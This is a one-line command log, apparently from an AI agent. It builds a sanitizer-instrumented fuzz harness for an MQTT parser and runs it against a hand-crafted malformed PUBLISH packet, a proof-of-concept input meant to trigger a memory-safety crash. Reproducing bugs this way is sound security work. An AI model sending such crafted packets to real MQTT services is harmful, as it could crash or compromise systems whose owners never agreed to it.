Running command: bash /workspace/build.sh 'cd /gt/_work/src && gcc -g -fsanitize=address -DMG_ENABLE_SOCKET=0 -DMG_ENABLE_LOG=0 -DMG_ENABLE_LINES=1 -DMG_ENABLE_TCPIP=1 -DMAIN -I. test/fuzz.c -o /tmp/fuzz_asan 2>&1 | tail -5 && python3 -c "
import struct
topic = b\"a\"
remaining = 2 + len(topic) + 3
poc = bytes([0x30, remaining]) + struct.pack(\">H\", len(topic)) + topic + bytes([0x80, 0x80, 0x00])
with open(\"/tmp/poc.bin\", \"wb\") as f:
    f.write(poc)
print(\"PoC:\", poc.hex(), \"len:\", len(poc))
" && /tmp/fuzz_asan /tmp/poc.bin 2>&1 | head -80'
